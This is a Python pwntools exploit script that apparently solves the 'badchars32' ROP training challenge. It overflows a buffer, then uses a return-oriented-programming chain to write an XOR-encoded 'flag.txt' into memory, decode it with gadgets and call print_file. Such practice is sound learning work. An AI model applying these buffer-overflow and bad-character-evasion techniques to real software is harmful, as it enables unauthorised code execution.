#/usr/bin/python3
from pwn import process, p32, xor, log

shell = process("./badchars32")

offset = 44
junk = b"A" * offset

data = 0x0804a018

string = xor(b"flag.txt", 2)

print_file = p32(0x80483d0)

pop_esi_edi_ebp = p32(0x080485b9)
mov_edi_esi = p32(0x0804854f)
xor_ebp_bl = p32(0x08048547)
pop_ebp = p32(0x080485bb)
pop_ebx = p32(0x0804839d)

payload  = b""
payload += junk
payload += pop_esi_edi_ebp + string[:4] + p32(data) + p32(0)
payload += mov_edi_esi
payload += pop_esi_edi_ebp + string[4:] + p32(data + 4) + p32(0)
payload += mov_edi_esi

for i in range(8):
    payload += pop_ebp + p32(data + i)
    payload += pop_ebx + p32(2)
    payload += xor_ebp_bl

payload += print_file
payload += b"B" * 4
payload += p32(data)

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
